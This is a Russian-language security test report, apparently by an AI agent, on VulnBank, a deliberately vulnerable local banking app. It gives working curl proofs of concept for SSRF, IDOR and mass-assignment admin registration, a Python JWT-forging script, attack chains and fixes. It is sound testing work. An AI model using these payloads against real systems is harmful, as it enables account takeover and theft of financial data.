# Отчёт о тестировании безопасности: VulnBank
**Таргет:** http://localhost:5050 (VulnBank)  
**Дата:** 2026-04-12  
**Метод:** Black-box, dynamic testing (IDOR skill)  
**Тестировщик:** Claude Code (manual агент)

---

## Сводная таблица уязвимостей

| ID | Название | Тип | CVSS | CWE | Статус |
|----|----------|-----|------|-----|--------|
| VULN-001 | SSRF через upload_profile_picture_url | SSRF | 9.1 | CWE-918 | ✅ Confirmed |
| VULN-002 | Утечка JWT-секрета через SSRF + Internal Endpoint | Info Disclosure | 9.8 | CWE-200 | ✅ Confirmed |
| VULN-003 | Подделка JWT-токена (JWT Forgery) | Auth Bypass | 9.8 | CWE-347 | ✅ Confirmed |
| VULN-004 | BOPLA — mass assignment `is_admin` при регистрации | Privilege Escalation | 9.8 | CWE-915 | ✅ Confirmed |
| VULN-005 | IDOR — просмотр баланса чужого аккаунта | IDOR | 7.5 | CWE-639 | ✅ Confirmed |
| VULN-006 | IDOR — просмотр истории транзакций чужого аккаунта | IDOR | 7.5 | CWE-639 | ✅ Confirmed |
| VULN-007 | IDOR — заморозка чужой виртуальной карты | IDOR | 7.1 | CWE-639 | ✅ Confirmed |
| VULN-008 | IDOR — чтение транзакций чужой виртуальной карты | IDOR | 6.5 | CWE-639 | ✅ Confirmed |
| VULN-009 | Sensitive Data Exposure в /api/ai/system-info | Info Disclosure | 7.5 | CWE-200 | ✅ Confirmed |

---

## Детали уязвимостей

---

### VULN-001: SSRF через upload_profile_picture_url
**Severity:** CRITICAL (CVSS 9.1)  
**CWE:** CWE-918 (Server-Side Request Forgery)

**Описание:**  
Endpoint `/upload_profile_picture_url` принимает произвольный URL в поле `image_url` и выполняет HTTP-запрос с сервера без валидации. Это позволяет атакующему обращаться к внутренним эндпоинтам Docker-контейнера, недоступным снаружи.

**PoC:**
```bash
# Аутентифицированный запрос — fetch внутреннего секрета
curl -s -X POST http://localhost:5050/upload_profile_picture_url \
  -H "Authorization: Bearer <attacker_token>" \
  -H "Content-Type: application/json" \
  -d '{"image_url":"http://127.0.0.1:5000/internal/secret"}'

# Response:
# {"debug_info":{"fetched_url":"http://127.0.0.1:5000/internal/secret","http_status":200},"file_path":"static/uploads/783291_secret",...}

# Прочитать содержимое:
curl -s http://localhost:5050/static/uploads/783291_secret
```

**Влияние:** Доступ к внутренней сети, утечка секретов, чтение credentials из environment.

**Remediation:** Whitelist допустимых URL/доменов. Запретить loopback/private адреса (RFC 1918). Не сохранять произвольный контент под доступным URL.

---

### VULN-002: Утечка JWT-секрета через SSRF + Internal Endpoint
**Severity:** CRITICAL (CVSS 9.8)  
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Описание:**  
Внутренний endpoint `/internal/secret` (доступный только через loopback) возвращает критические секреты: JWT-ключ, credentials БД, переменные окружения. В связке с VULN-001 атакующий получает полный доступ к секретам.

**Утечка данных:**
```json
{
  "secrets": {
    "app_secret_key": "secret123",
    "jwt_secret": "secret123",
    "env_preview": {
      "DB_HOST": "db",
      "DB_NAME": "vulnerable_bank",
      "DB_PASSWORD": "postgres",
      "DB_USER": "postgres",
      "DB_PORT": "5432"
    }
  }
}
```

**PoC:**
```bash
# Step 1: SSRF fetch internal secret (см. VULN-001)
curl -s -X POST http://localhost:5050/upload_profile_picture_url \
  -H "Authorization: Bearer <token>" \
  -d '{"image_url":"http://127.0.0.1:5000/internal/secret"}'

# Step 2: Read saved file
curl -s http://localhost:5050/static/uploads/783291_secret
# → JWT secret: "secret123", DB password: "postgres"
```

**Remediation:** Не хранить секреты в коде/эндпоинтах. Использовать vault (HashiCorp Vault, AWS Secrets Manager). Удалить `/internal/*` эндпоинты или закрыть через сетевые правила.

---

### VULN-003: Подделка JWT-токена (JWT Forgery)
**Severity:** CRITICAL (CVSS 9.8)  
**CWE:** CWE-347 (Improper Verification of Cryptographic Signature)

**Описание:**  
Зная JWT-секрет (`secret123`, полученный через VULN-002), атакующий может сформировать произвольный JWT-токен для любого пользователя, включая администратора (user_id=1).

**PoC:**
```bash
python3 -c "
import base64, hmac, hashlib, json, time

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = json.dumps({'typ':'JWT','alg':'HS256'}, separators=(',',':'))
payload = json.dumps({'user_id':1,'username':'admin','is_admin':True,'iat':int(time.time())}, separators=(',',':'))
h, p = b64url_encode(header), b64url_encode(payload)
msg = f'{h}.{p}'.encode()
sig = hmac.new(b'secret123', msg, hashlib.sha256).digest()
print(f'{h}.{p}.{b64url_encode(sig)}')
"

# Использовать полученный токен для доступа к admin панели
curl -s http://localhost:5050/sup3r_s3cr3t_admin \
  -H "Authorization: Bearer <forged_token>"
# → HTTP 200, full admin panel with all users
```

**Влияние:** Полный захват любой учётной записи, включая администратора. Доступ ко всем административным функциям.

**Remediation:** Использовать криптографически случайный секрет (>32 байт). Ротация JWT-ключей. Хранить секрет в vault, не в коде.

---

### VULN-004: BOPLA — Mass Assignment `is_admin` при регистрации
**Severity:** CRITICAL (CVSS 9.8)  
**CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)

**Описание:**  
Endpoint `/register` принимает поле `is_admin` из тела запроса и сохраняет его в БД без валидации. Любой пользователь может зарегистрироваться с правами администратора.

**PoC:**
```bash
curl -s -X POST http://localhost:5050/register \
  -H "Content-Type: application/json" \
  -d '{"username":"superadmin_test","password":"Admin1!","is_admin":true}'

# Response:
# {"debug_data":{"is_admin":true,"fields_registered":["username","password","account_number","is_admin"],...}}

# Login and access admin panel:
curl -s http://localhost:5050/sup3r_s3cr3t_admin \
  -H "Authorization: Bearer <admin_token>"
# → HTTP 200, full admin access
```

**Влияние:** Любой пользователь может получить права администратора, просматривать/удалять все аккаунты, одобрять кредиты.

**Remediation:** Никогда не доверять клиентским данным для чувствительных полей. Использовать whitelist разрешённых полей. `is_admin` должен устанавливаться только серверной логикой.

---

### VULN-005: IDOR — просмотр баланса чужого аккаунта
**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Описание:**  
Endpoint `GET /check_balance/{account_number}` не проверяет, принадлежит ли запрашиваемый номер счёта аутентифицированному пользователю. Атакующий может получить баланс и username любого аккаунта.

**PoC:**
```bash
# Attacker (account 7556229114) checks victim's balance (account 8717432571)
curl -s http://localhost:5050/check_balance/8717432571 \
  -H "Authorization: Bearer <attacker_token>"

# Response:
# {"account_number":"8717432571","balance":1000.0,"status":"success","username":"victim_idor"}
```

**Remediation:** Проверять что `account_number` принадлежит текущему пользователю из JWT-токена.

---

### VULN-006: IDOR — просмотр истории транзакций чужого аккаунта
**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Описание:**  
Endpoint `GET /transactions/{account_number}` не проверяет принадлежность счёта. Атакующий может получить полную историю транзакций любого пользователя.

**PoC:**
```bash
curl -s http://localhost:5050/transactions/8717432571 \
  -H "Authorization: Bearer <attacker_token>"

# Response:
# {"account_number":"8717432571","status":"success","transactions":[...]}
```

**Remediation:** Фильтровать транзакции по `user_id` из JWT-токена, не из URL-параметра.

---

### VULN-007: IDOR — заморозка чужой виртуальной карты
**Severity:** HIGH (CVSS 7.1)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Описание:**  
Endpoint `POST /api/virtual-cards/{card_id}/toggle-freeze` не проверяет принадлежность карты. Атакующий может заморозить (или разморозить) виртуальную карту любого пользователя, вызывая DoS на финансовые операции.

**PoC:**
```bash
# Victim creates card → card_id=1
# Attacker freezes victim's card:
curl -s -X POST http://localhost:5050/api/virtual-cards/1/toggle-freeze \
  -H "Authorization: Bearer <attacker_token>"

# Response:
# {"message":"Card frozen successfully","status":"success"}
```

**Remediation:** Проверять что `card.user_id == current_user.id` перед любым изменением карты.

---

### VULN-008: IDOR — чтение транзакций чужой виртуальной карты
**Severity:** MEDIUM (CVSS 6.5)  
**CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

**Описание:**  
Endpoint `GET /api/virtual-cards/{card_id}/transactions` доступен без проверки владельца карты.

**PoC:**
```bash
curl -s http://localhost:5050/api/virtual-cards/1/transactions \
  -H "Authorization: Bearer <attacker_token>"
# → Возвращает транзакции карты жертвы (HTTP 200)
```

**Remediation:** Добавить проверку `card.user_id == current_user.id`.

---

### VULN-009: Sensitive Data Exposure в /api/ai/system-info
**Severity:** HIGH (CVSS 7.5)  
**CWE:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)

**Описание:**  
Endpoint `GET /api/ai/system-info` доступен без аутентификации и раскрывает: полный system prompt AI-агента (включая инструкции для prompt injection), схему БД, настройки API, список уязвимостей.

**PoC:**
```bash
curl -s http://localhost:5050/api/ai/system-info | python3 -m json.tool
# → system_prompt, DB table names, API provider credentials status
```

**Remediation:** Удалить эндпоинт или ограничить доступ только для администраторов. Не включать system prompt в API-ответы.

---

## Цепочки атак

### Chain 1: Anonymous → Full Admin (CRITICAL)
```
1. VULN-004 (BOPLA): POST /register {"is_admin":true}
   → Получаем admin-аккаунт

2. POST /login → admin JWT-токен

3. GET /sup3r_s3cr3t_admin → Полный список пользователей с балансами
```

### Chain 2: Authenticated User → Admin via SSRF + JWT Forgery (CRITICAL)
```
1. VULN-001 (SSRF): POST /upload_profile_picture_url
   {"image_url":"http://127.0.0.1:5000/internal/secret"}
   → Файл с секретами сохранён

2. VULN-002: GET /static/uploads/{filename}
   → jwt_secret: "secret123"

3. VULN-003 (JWT Forgery): Forge JWT для user_id=1, is_admin=true
   → Полный доступ как admin
```

---

## Рекомендации (приоритизация)

| Приоритет | Уязвимость | Исправление |
|-----------|------------|-------------|
| P0 | VULN-004 BOPLA | Убрать `is_admin` из allowlist регистрации |
| P0 | VULN-001 SSRF | Валидация URL, блокировка private/loopback |
| P0 | VULN-002 Internal Secrets | Удалить `/internal/*` или закрыть сетевыми правилами |
| P0 | VULN-003 JWT Forgery | Случайный JWT-секрет (>256 bit) в vault |
| P1 | VULN-005,006 IDOR Balance/Tx | Server-side user ownership check |
| P1 | VULN-007,008 IDOR Cards | Card ownership validation |
| P2 | VULN-009 AI Info Exposure | Удалить или требовать auth |
